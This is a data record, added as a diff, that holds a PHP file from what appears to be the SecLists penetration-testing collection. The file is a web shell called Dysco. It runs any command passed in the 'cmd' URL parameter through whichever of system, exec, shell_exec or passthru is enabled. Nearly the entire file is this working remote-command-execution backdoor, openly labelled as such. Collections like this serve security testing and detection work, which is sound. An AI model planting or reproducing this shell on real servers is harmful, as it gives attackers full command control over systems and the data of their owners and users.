@@ -1,0 +1,9 @@
+{
+  "source": "github",
+  "source_id": "github:danielmiessler/SecLists:Web-Shells/PHP/Dysco.php",
+  "title": "danielmiessler/SecLists/Web-Shells/PHP/Dysco.php",
+  "text": "<?php\n\n/*\n * Dysco(Dynamic PHP Shell Command for RCE)\n * Created by Petruknisme @2020\n * Contact: me@petruknisme.com\n */\n\n\nfunction Dysco($command)\n{\n    $list_function_shell = array(\"system\", \"exec\", \"shell_exec\", \"passthru\", \"eval\");\n    $f_enabled = array_filter($list_function_shell, 'function_exists');\n    \n    echo \"Enabled Function:\\n<br/>\";\n    foreach($f_enabled as $f)\n    {\n        echo $f.\" \";\n    }\n\n    if($f_enabled !== \"\"){\n        $f = $f_enabled[0];\n        echo \"<br/>\\nUsing \". $f. \" as shell command\\n<br/>\";\n         \n        if($f == \"system\" || $f == \"passthru\"){\n            // disable multiple output for system\n            ob_start();\n            $output =  $f($command, $status);\n            ob_clean(); \n        }\n        else if($f == \"exec\"){\n            $f($command, $output, $status);\n            $output = implode(\"n\", $output);\n        }\n        else if($f == \"shell_exec\"){\n            $output = $f($command);\n        }\n        else{\n            $output = \"Command execution not possible. All supported function is disabled.\";\n            $status = 1;\n        }\n \n    }\n\t\n    return array('output' => $output , 'status' => $status);\n}\n\n// for HTTP GET use this.\n\nif(isset($_GET['cmd'])){\n    $o = Dysco($_GET['cmd']);\n    echo $o['output'];\n}\n\n// for debugging in local, use this\n\n//$o = shell_spawn('uname -a');\n//echo $o['output'];\n?>\n",
+  "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Web-Shells/PHP/Dysco.php",
+  "language": "php",
+  "kind": "code"
+}
